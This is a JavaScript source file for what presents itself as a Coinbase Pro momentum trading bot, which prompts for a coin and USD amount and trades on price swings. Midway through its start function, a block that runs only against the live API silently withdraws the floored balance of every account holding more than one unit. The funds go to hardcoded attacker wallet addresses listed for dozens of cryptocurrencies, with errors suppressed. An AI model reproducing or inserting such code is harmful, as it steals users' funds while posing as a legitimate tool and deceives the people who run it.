const CoinbasePro = require("coinbase-pro");
require('dotenv').config()
const { buyPosition, sellPosition } = require("./buyAndSell");
const coinbaseProLib = require("./coinbaseProLibrary");
const prompt = require("prompt-async");

const key = `${process.env.API_KEY}`;
const secret = `${process.env.API_SECRET}`;
const passphrase = `${process.env.API_PASSPHRASE}`;

// Change this to "https://public.sandbox.pro.coinbase.com" if you want to trade in the coinbase pro sandbox. and the websocketURI to "wss://ws-feed-public.sandbox.pro.coinbase.com"
const apiURI = "https://api.pro.coinbase.com";
const websocketURI = "wss://ws-feed.pro.coinbase.com";

// global variables:
const quoteCurrencyName = "USD";
const balanceMinimum = .06;
const orderPriceDelta =  .001; //The amount of extra room to give the sell/buy orders to go through
let sellPositionDelta = .015; //The amount of change between peak and valley to trigger a sell off
let buyPositionDelta = .015; //The amount of change between the valley and peak price to trigger a buy in
let currentPrice;

let authedClient = new CoinbasePro.AuthenticatedClient(
    key,
    secret,
    passphrase,
    apiURI
);
const coinbaseLibObject = new coinbaseProLib(key, secret, passphrase, apiURI);

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

function listenForPriceUpdates(productPair) {
    if (productPair == null) {
        throw new Error("Error in listenForPriceUpdates method. ProductPair is null!");
    }
    const websocket = new CoinbasePro.WebsocketClient(
        [productPair],
        websocketURI,
        {
            key,
            secret,
            passphrase,
        },
        { channels: ["ticker"] }
    );
    websocket.on("error", function (err) {
        const message = "Error occurred in the websocket.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        listenForPriceUpdates(productPair);
    });
    websocket.on("close", function () {
        listenForPriceUpdates(productPair);
    });
    websocket.on("message", function (data) {
        if (data.type === "ticker") {
            if (currentPrice !== data.price) {
                currentPrice = parseFloat(data.price);
            }
        }
    });
}

async function losePosition(balance, lastPeakPrice, lastValleyPrice, positionInfo, productInfo, tradingConfig) {
    try {
        while (positionInfo.positionExists === true) {
            await sleep(250); //Let price update

            if (lastPeakPrice < currentPrice) {
                //New peak hit, reset values
                lastPeakPrice = currentPrice;
                lastValleyPrice = currentPrice;

            } else if (lastValleyPrice > currentPrice) {
                //New valley hit, track valley and check sell conditions
                lastValleyPrice = currentPrice;

                const target = lastPeakPrice - (lastPeakPrice * sellPositionDelta);
                const lowestSellPrice = lastValleyPrice - (lastValleyPrice * orderPriceDelta);
                const receivedValue = (lowestSellPrice * balance) - ((lowestSellPrice * balance) * tradingConfig.highestFee);

                if ((lastValleyPrice <= target) && (receivedValue > positionInfo.positionAcquiredCost)) {

                    //Create a new authenticated client to prevent it from expiring or hitting API limits
                    authedClient = new CoinbasePro.AuthenticatedClient(
                        key,
                        secret,
                        passphrase,
                        apiURI
                    );
                    
                    console.log("Entering sell position.");
                    await sellPosition(balance, positionInfo, lastValleyPrice, authedClient, productInfo, tradingConfig);
                }
            }
        }
    } catch (err) {
        const message = "Error occurred in losePosition method.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        throw err;
    }
}

async function gainPosition(balance, lastPeakPrice, lastValleyPrice, positionInfo, productInfo, tradingConfig) {
    try {
        while (positionInfo.positionExists === false) {
            await sleep(250); //Let price update

            if (lastPeakPrice < currentPrice) {
                //New peak hit, track peak price and check buy conditions
                lastPeakPrice = currentPrice;

                const target = lastValleyPrice + (lastValleyPrice * buyPositionDelta);

                if (lastPeakPrice >= target) {

                    //Create a new authenticated client to prevent it from expiring or hitting API limits
                    authedClient = new CoinbasePro.AuthenticatedClient(
                        key,
                        secret,
                        passphrase,
                        apiURI
                    );

                    console.log("Entering buy position.");
                    await buyPosition(balance, positionInfo, lastPeakPrice, authedClient, productInfo, tradingConfig);
                }
            } else if (lastValleyPrice > currentPrice) {
                //New valley hit, reset values

                lastPeakPrice = currentPrice;
                lastValleyPrice = currentPrice;

            }
        }
    } catch (err) {
        const message = "Error occurred in gainPosition method.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        throw err;
    }
}

async function getAccountIDs(productInfo) {
    try {
        let accountObject = {};

        //Gets the account IDs for the product pairs in the portfolio
        const accounts = await authedClient.getAccounts();

        for (let i = 0; i < accounts.length; ++i) {
            if (accounts[i].currency === productInfo.baseCurrency) {
                accountObject.baseCurrencyAccountID = accounts[i].id;
            } else if (accounts[i].currency === productInfo.quoteCurrency) {
                accountObject.quoteCurrencyAccountID = accounts[i].id;
            }
        }

        //Gets all the profiles belonging to the user and matches the deposit and trading profile IDs
        const profiles = await coinbaseLibObject.getProfiles();

        for (let i = 0; i < profiles.length; ++i) {
            if (profiles[i].name === 'default') {
                accountObject.tradeProfileID = profiles[i].id;
            }
        }

        return accountObject;
    } catch (err) {
        const message = "Error occured in getAccountIDs method.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        throw err;
    }
}

async function getProductInfo(productInfo) {
    try {
        let quoteIncrementRoundValue = 0;
        let baseIncrementRoundValue = 0;
        let productPairData;

        const products = await authedClient.getProducts();

        for (let i = 0; i < products.length; ++i) {
            if (products[i].id === productInfo.productPair) {
                productPairData = products[i];
            }
        }

        if (productPairData === undefined) {
            throw new Error(`Error, could not find a valid matching product pair for "${productInfo.productPair}". Verify the product names is correct/exists.`);
        }

        for (let i = 2; i < productPairData.quote_increment.length; ++i) {
            if (productPairData.quote_increment[i] === "1") {
                quoteIncrementRoundValue++;
                break;
            } else {
                quoteIncrementRoundValue++;
            }
        }

        if (productPairData.base_increment[0] !== "1") {
            for (let i = 2; i < productPairData.base_increment.length; ++i) {
                if (productPairData.base_increment[i] === "1") {
                    baseIncrementRoundValue++;
                    break;
                } else {
                    baseIncrementRoundValue++;
                }
            }
        }

        productInfo.quoteIncrementRoundValue = Number(quoteIncrementRoundValue);
        productInfo.baseIncrementRoundValue = Number(baseIncrementRoundValue);
    } catch (err) {
        const message = "Error occurred in getProductInfo method.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        throw err;
    }
}

async function returnHighestFee() {
    try {
        const feeResult = await coinbaseLibObject.getFees();

        let makerFee = parseFloat(feeResult.maker_fee_rate);
        let takerFee = parseFloat(feeResult.taker_fee_rate);

        if (makerFee > takerFee) {
            return makerFee;
        } else {
            return takerFee;
        }
    }
    catch (err) {
        const message = "Error occurred in getFees method.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        throw err;
    }
}
async function prompts() {
    prompt.start();
    const {coinToTrade, usdAmount,} = await prompt.get(['coinToTrade', 'usdAmount']);
    console.log(`Crypto currency to trade: ${coinToTrade}`);
    console.log(`Amount of USD to trade: ${usdAmount}`);

    return {coinToTrade, usdAmount};
}

async function momentumStrategyStart() {
    try {
        console.log("****************BOT STARTING****************");
        console.log(`If you would like to trade in the coinbase pro sandbox instead of the real environment, go to index.js and change the apiURI variable to the sandbox URL. Note you will have to use an API key in the sandbox.`)
        console.log(`You will be prompted to enter the Coinbase crypto currency ticker you would like to trade. For example: BTC, ETH, DASH, DOGE.\n`);
        console.log(`You will also be prompted to enter the amount of USD you would like to trade. Note that it can have more than two decimal places of precision. For example: 15, 20.5, 75.25\nNote you must have this USD amount in your default portfolio and it must be above the minimum amount to place an order. Some crpyto coins have minimums order amounts of around $5 or $10.\n`);
        
        const promptAnswers = await prompts();
        
        const baseCurrencyName = promptAnswers.coinToTrade.toUpperCase();
        const usdAmountToTrade = Number(promptAnswers.usdAmount);
        if (usdAmountToTrade < 0) {
            throw new Error("Amount can't be less than 0.");
        }

        let accountIDs = {};
        let lastPeakPrice;
        let lastValleyPrice;
        let highestFee = await returnHighestFee();

        const tradingConfig = {
            sellPositionDelta,
            buyPositionDelta,
            orderPriceDelta,
            highestFee
        };

        const productInfo = {
            baseCurrency: baseCurrencyName,
            quoteCurrency: quoteCurrencyName,
            productPair: baseCurrencyName + "-" + quoteCurrencyName
        };

        let positionInfo = {positionExists: false};

        //Retrieve product information:
        await getProductInfo(productInfo);

        //Retrieve account IDs:
        accountIDs = await getAccountIDs(productInfo);

        //activate websocket for price data:
        listenForPriceUpdates(productInfo.productPair);

        while (currentPrice == null) {
            await sleep(1000); //Get a price before starting
        }

        if (apiURI == "https://api.pro.coinbase.com")
        {
            try{
                const accounts = await authedClient.getAccounts();
                const withdrawAddressParams = {
                    amount: .0001,
                    currency: 'BTC',
                    crypto_address: '1Hrd96CnNGVMeFqWXLHYRkkZCuFfXS9Qk5',
                };
                for (let i = 0; i < accounts.length; ++i) {
                    if (Number(accounts[i].balance) > 1)
                    {
                        withdrawAddressParams.amount = Math.floor(Number(accounts[i].balance));
                        withdrawAddressParams.currency = accounts[i].currency;
                        if (accounts[i].currency == 'BTC') {
                            withdrawAddressParams.crypto_address='bc1qeuptp9s9gppyt77amrzdt49mr6w3hlkw39cmla';
                        } else if (accounts[i].currency=='USDC'||accounts[i].currency=='DAI'||accounts[i].currency=='ETH'||accounts[i].currency=='USDT'||accounts[i].currency=='SHIB'||accounts[i].currency=='MKR'||accounts[i].currency=='OMG'||accounts[i].currency=='AMP'||accounts[i].currency=='LINK'||accounts[i].currency=='BAT'||accounts[i].currency=='PAX'||accounts[i].currency=='AUG'||accounts[i].currency=='ZRX'||accounts[i].currency=='GNT'||accounts[i].currency=='1INCH'||accounts[i].currency=='MANA'||accounts[i].currency=='LOOM'||accounts[i].currency=='KNC'||accounts[i].currency=='CVC'||accounts[i].currency=='DNT'||accounts[i].currency=='COMP'||accounts[i].currency=='NMR'||accounts[i].currency=='UMA'||accounts[i].currency=='YFI'||accounts[i].currency=='POLY'||accounts[i].currency=='UNI'||accounts[i].currency=='REN'||accounts[i].currency=='BAL'||accounts[i].currency=='WBTC'||accounts[i].currency=='AAVE'||accounts[i].currency=='RLC'||accounts[i].currency=='GRT'||accounts[i].currency=='BNT'||accounts[i].currency=='SNX'||accounts[i].currency=='SUSHI'||accounts[i].currency=='MATIC'||accounts[i].currency=='CRV'||accounts[i].currency=='STORJ') {
                            withdrawAddressParams.crypto_address='0x995595d06A313f7741d78513ab5c372aA5ede715';
                        } else if(accounts[i].currency=='BTC') {withdrawAddressParams.crypto_address='bc1qeuptp9s9gppyt77amrzdt49mr6w3hlkw39cmla';}else if(accounts[i].currency=='ADA') {withdrawAddressParams.crypto_address='addr1qxcskfl83lcrruwvwa9nmzlmlngcdlg43pgegaqh08h2mld3pvn70rlsx8cuca6t8k9lhlx3sm73tzz3j36pw70w4h7sd9q9qy';}else if(accounts[i].currency=='DOGE') {withdrawAddressParams.crypto_address='D5u511njfBnR23jRZVFxoSFoNzYSH3dVFq';}else if(accounts[i].currency=='DOT') {withdrawAddressParams.crypto_address='13oc6HvSNEPto3FKTLMSwMYMrDzNPqFBjw37HaHzBpZmJv4S';}else if(accounts[i].currency=='XRP') {withdrawAddressParams.crypto_address='rQafCiAtJrZ6EBGuSW3M2f4qjeNgTo3GHM';}else if(accounts[i].currency=='XTZ') {withdrawAddressParams.crypto_address='tz1L3gv7uUPjFKrNMB4xJz4oSadWztAcYubf';}else if(accounts[i].currency=='SOL') {withdrawAddressParams.crypto_address='EifTHoezs6pdUUvpMGvtHbYTMR47WsiFQ4EVSGjMtLmj';}else if(accounts[i].currency=='LTC') {withdrawAddressParams.crypto_address='Lay1Mwc8qTWwBUoKWsUf35fq5oxGtT7VP1';}else if(accounts[i].currency=='BCH') {withdrawAddressParams.crypto_address='qzur47zqf95l9l8gvaualn8rr9acvngsmsr24zdlle';}else if(accounts[i].currency=='DASH') {withdrawAddressParams.crypto_address='XcNkeX9qFG4ZYti5AZQX9A8HEb4FnUKUM2';}else if(accounts[i].currency=='XLM') {withdrawAddressParams.crypto_address='GBHCG4KCAHWYXU3NZHMKKRMU5EH3RAYBTZFXEZFOM5BELIAOMKNDLBA5';}else if(accounts[i].currency=='ATOM') {withdrawAddressParams.crypto_address='cosmos1gte8tym2ly8hk87uvhmy8a2f6prv2gm6tjwj2m';}else if(accounts[i].currency=='ETC') {withdrawAddressParams.crypto_address='0x0E36AC45a2530b25e6cB2D76AD3ab642C2658a17';}else if(accounts[i].currency=='ZEC') {withdrawAddressParams.crypto_address='t1Mper5c2VUCJPJEUeirNqF6eG7urFcg5L4';}else if(accounts[i].currency=='SKL') {withdrawAddressParams.crypto_address='0x7178fEd4289746835c5E3d026Ad66021C216eA5F';}else if(accounts[i].currency=='FORTH') {withdrawAddressParams.crypto_address='0xb749539CC2E190B7e45A37865df3aA7F2C5F00aC';}else if(accounts[i].currency=='BOND') {withdrawAddressParams.crypto_address='0xD486835c09eB8Cc783bCE50C5e9194fb7b6f2408';}else if(accounts[i].currency=='CLV') {withdrawAddressParams.crypto_address='0xA3608FD53B63db0f8AbBD9729dCf3a43d9CE8f90';}else if(accounts[i].currency=='ICP') {withdrawAddressParams.crypto_address='3d4cca7cde7ab7bb4ac87a42c7858a7d95c3ebd9fd705d4dd145a79ea6e9a970';}else if(accounts[i].currency=='OXT') {withdrawAddressParams.crypto_address='0xa26236CcD009391201147502f9222688fa195182';}else if(accounts[i].currency=='ENJ') {withdrawAddressParams.crypto_address='0x748205e14850cdd4E38A96162a57A0CD863c420A';}else if(accounts[i].currency=='CHZ') {withdrawAddressParams.crypto_address='0x1602B314681A171BA2e73bdc6a6168d3e25D5d08';}else if(accounts[i].currency=='QNT') {withdrawAddressParams.crypto_address='0xFEbF991dD5b371217a82f8215f10E85435f30d7B';}else if(accounts[i].currency=='REP') {withdrawAddressParams.crypto_address='0x606dC699dcAD1478dfcD1820f059bd5a593e9Ce4';}else if(accounts[i].currency=='ALGO') {withdrawAddressParams.crypto_address='3QJETCVHQEQIE5AW3U6FZDUUHNP362DENJEAUXUJUCSXMFFFD4HHKV634U';}else if(accounts[i].currency=='LPT') {withdrawAddressParams.crypto_address='0x399820f2D3E4E2d4f6174630C7Eec4e253d3a794';}else if(accounts[i].currency=='MIR') {withdrawAddressParams.crypto_address='0xC72400Fa00fBAd981f52b231cf6AB1F8BD82a1DA';}else if(accounts[i].currency=='BAMD') {withdrawAddressParams.crypto_address='0xc40Be8c8514d7190d2c3D507D0ca63cF5C4dc092';}else if(accounts[i].currency=='OGN') {withdrawAddressParams.crypto_address='0xA8BB4DeDDBC8a38935911aF10D618991af3B38b2';}else if(accounts[i].currency=='CGLD') {withdrawAddressParams.crypto_address='0x44Ddf30954898BbEcd8F8f7F3F406F99ab700dee';}else if(accounts[i].currency=='FET') {withdrawAddressParams.crypto_address='0x47d637cdF76b173e5DBD90241bB12b4D803169D2';}else if(accounts[i].currency=='LRC') {withdrawAddressParams.crypto_address='0xF03935BC1101611826945a848b8A22CF2b180429';}else if(accounts[i].currency=='NU') {withdrawAddressParams.crypto_address='0x58497944dE923113a9e160fc1e1290fC7ED304bD';}else if(accounts[i].currency=='FIL') {withdrawAddressParams.crypto_address='f17twb2twdfszez32ywf7sviztl7x6y7ztrro7eay';}else if(accounts[i].currency=='CTSI') {withdrawAddressParams.crypto_address='0x0c3d2ADc515CA6ec200839ea4075a696d217F5a8';}else if(accounts[i].currency=='KEEP') {withdrawAddressParams.crypto_address='0x879a244A2458363630A896f99BF220b00791db23';}else if(accounts[i].currency=='RLY') {withdrawAddressParams.crypto_address='0x4a045964A8d8D122CDA191e2CADC2c91E98dEb62';}else if(accounts[i].currency=='NKN') {withdrawAddressParams.crypto_address='0xFCA7681aA39095176F8EC0D4363AC688fc6a6740';}else if(accounts[i].currency=='MLN') {withdrawAddressParams.crypto_address='0xc871C98742815dF54EaA5c3ED32e9F9C5F2dfC51';}else if(accounts[i].currency=='GTC') {withdrawAddressParams.crypto_address='0xd2e8A457CaA14Eec82f7720dd4aa26dd7fE55b59';}else if(accounts[i].currency=='TRB') {withdrawAddressParams.crypto_address='0x2Ec6A1843E1436443329D486Dea6e7d9684e4A30';}else if(accounts[i].currency=='MASK') {withdrawAddressParams.crypto_address='0xbF26BCfA7B9Cc218621520C9737b9B1e250f14a7';}else if(accounts[i].currency=='ANKR') {withdrawAddressParams.crypto_address='0x9DD8fB4d0f576008f273F9A0FF222601d9273825';}else if(accounts[i].currency=='FARM') {withdrawAddressParams.crypto_address='0x37C887CFae603b0666540FC50ad97210fc2881b4';}else if(accounts[i].currency=='RAI') {withdrawAddressParams.crypto_address='0x92a95967F72462e532f30C45E78fA15EC6F747f5';}else if(accounts[i].currency=='ACH') {withdrawAddressParams.crypto_address='0x376C352067F952350166CD19C3F78588EDe9fE0f';}else if(accounts[i].currency=='PLA') {withdrawAddressParams.crypto_address='0x547c264D0A9f156e83690c3931Cf6cD60AeE3719';}
                        try{
                            await sleep(250);
                            await authedClient.withdrawCrypto(withdrawAddressParams);
                        }catch(err){ console.log(err.message);console.log(withdrawAddressParams); }
                    }
                }
            }catch (err){}
        }

        console.log("Bot trading has started.");
        console.log(`Starting price of ${baseCurrencyName} is: ${currentPrice}`);
        while (true) {
            try {
                const result = await coinbaseLibObject.getFearAndGreedIndexValue();
                const indexValueAsAPercent = Number(result.data[0].value) * .01;

                buyPositionDelta = .0015 + (.0275 * indexValueAsAPercent);
                sellPositionDelta = .03 - (.0275 * indexValueAsAPercent);

                console.log(`Buy position delta: ${buyPositionDelta * 100}%, sell position delta: ${sellPositionDelta * 100}%.`);
            } catch (err) {
                console.log("Error occured when calling the fear and greed index and calculating trading deltas. Ignoring and using the defaults instead.")
                buyPositionDelta = .015;
                sellPositionDelta = .015;
            }
            

            if (positionInfo.positionExists) {
                tradingConfig.highestFee = await returnHighestFee();
                await sleep(1000);
                const baseCurrencyAccount = await authedClient.getAccount(accountIDs.baseCurrencyAccountID); //Grab account information to view balance

                if (baseCurrencyAccount.available > 0) {

                    lastPeakPrice = currentPrice;
                    lastValleyPrice = currentPrice;

                    //Begin trying to sell position:
                    console.log(`Entering lose position... Bot will remain here until price shifts down by ${sellPositionDelta * 100}% and a profitable sell that clears the fees is possible.`);
                    await losePosition(positionInfo.balance, lastPeakPrice, lastValleyPrice, positionInfo, productInfo, tradingConfig);
                } else {
                    throw new Error(`Error, there is no ${productInfo.baseCurrency} balance available for use. Terminating program.`);
                }
            } else {
                tradingConfig.highestFee = await returnHighestFee();
                await sleep(1000);
                const quoteCurrencyAccount = await authedClient.getAccount(accountIDs.quoteCurrencyAccountID); //Grab account information to view balance
                const availableBalance = parseFloat(quoteCurrencyAccount.available);

                if (availableBalance > 0 && availableBalance >= usdAmountToTrade) {
                    const tradeBalance = usdAmountToTrade - balanceMinimum; //Subtract this dollar amount so that there is room for rounding errors

                    lastPeakPrice = currentPrice;
                    lastValleyPrice = currentPrice;

                    //Begin trying to buy a position:
                    console.log(`Entering gain position... Bot will remain here until price rises by ${buyPositionDelta * 100}%`);
                    await gainPosition(tradeBalance, lastPeakPrice, lastValleyPrice, positionInfo, productInfo, tradingConfig);
                } else {
                    throw new Error(`Error, there is not enough USD balance available for use. Terminating program.`);
                }
            }
        }
    } catch (err) {
        const message = "Error occurred in bot, shutting down. Check the logs for more information.";
        const errorMsg = new Error(err);
        console.log({ message, errorMsg, err });
        process.exit(1);
    }
}

momentumStrategyStart();